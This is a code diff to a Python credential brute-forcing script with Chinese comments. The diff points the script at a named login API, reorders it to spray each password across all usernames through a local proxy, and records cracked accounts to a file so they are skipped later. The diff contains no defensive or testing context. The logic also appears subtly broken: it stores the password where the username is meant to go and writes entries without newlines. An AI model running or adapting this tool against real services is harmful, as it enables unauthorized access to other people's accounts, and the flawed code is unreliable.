@@ -5,7 +5,7 @@ import tenacity
 import SpiderDb
 from concurrent.futures import ThreadPoolExecutor
 import threading
-
+import os
 
 
 class Spider:
@@ -20,6 +20,11 @@ class Spider:
         self.time_sleep = time_sleep
         self.pool = ThreadPoolExecutor(max_workers=5)
         self.lock = threading.Lock()
+        if not os.path.exists('successful_user.txt'):
+            with open('successful_user.txt', 'w') as af:
+                af.write('.')
+        with open('successful_user.txt', 'r') as af:
+            self.successful_users = [x.strip() for x in af.readlines()]
 
     # 插入请求数据到数据库
     def insert_request(self, this_url, this_user, this_pwd):
@@ -45,7 +50,7 @@ class Spider:
         # 检查用户名和密码是否已经被尝试过，如果是则跳过
         if self.check_pass(this_username=this_username, this_password=this_password):
             print(f"{this_username} {this_password} 跳过")
-            return False
+            return (this_password, this_username), False
 
         try:
             # 发送HTTP请求，并检查响应状态码
@@ -54,7 +59,7 @@ class Spider:
         except requests.exceptions.RequestException as e:
             # 捕获并记录异常信息
             logging.error(f"请求失败：{e}")
-            return False
+            return (this_password, this_username), False
 
         # 记录HTTP请求和响应数据到数据库
         print(f"状态码：{res.status_code} URL: {res.url}")
@@ -65,8 +70,8 @@ class Spider:
         # 判断是否登录成功
         if '"code":5' not in res.text and '|' in res.text:
             print(f"{this_username} {this_password} 成功！！！")
-            return True
-        return False
+            return (this_password, this_username), True
+        return (this_password, this_username), False
 
     # 检查用户名和密码是否已经被尝试过
     def check_pass(self, this_username, this_password):
@@ -80,12 +85,16 @@ class Spider:
 
     # 主函数
     def main(self):
-        for username in self.usernames:
-            res_list = [self.pool.submit(self.get_response, username, password) for password in passwords]
+        for passwd in self.passwords:
+            res_list = [self.pool.submit(self.get_response, username, passwd) for username in self.usernames if
+                        username not in self.successful_users]
             for result in res_list:
                 success = result.result()
-                if success:
-                    break
+                if success[1]:
+                    print(f"{success[0]}成功")
+                    self.successful_users.append(success[0][0])
+                    with open('successful_user.txt', 'w') as af:
+                        af.writelines(self.successful_users)
         self.db.close()
 
 
@@ -102,7 +111,7 @@ if __name__ == '__main__':
     # 初始化爬虫对象
     spider = Spider(
         proxy={'https': 'http://localhost:8889', 'http': 'http://localhost:8889'},
-        url='https:',
+        url='https://api.qisms.com/api',
         usernames=usernames,
         passwords=passwords,
         time_sleep=0.1,
